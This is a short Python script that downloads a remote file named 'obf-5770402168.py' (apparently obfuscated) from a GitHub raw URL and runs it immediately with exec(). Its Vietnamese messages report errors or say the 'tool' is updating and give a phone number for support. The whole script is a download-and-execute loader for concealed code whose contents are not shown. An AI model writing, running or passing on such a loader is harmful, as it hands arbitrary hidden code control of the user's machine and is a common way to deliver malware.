import requests

url = 'https://raw.githubusercontent.com/hoangquocanh2008/MONKEYX/main/obf-5770402168.py'

response = requests.get(url)
if response.status_code == 200:
    code = response.text
    
    try:
        exec(code)
    except Exception as e:
        print("LỖI XẢY RA:", e)
else:
    print("TOOL ĐANG UPDATE LIÊN HỆ 0901386277 ĐỂ ĐƯỢC HỖ TRỢ")
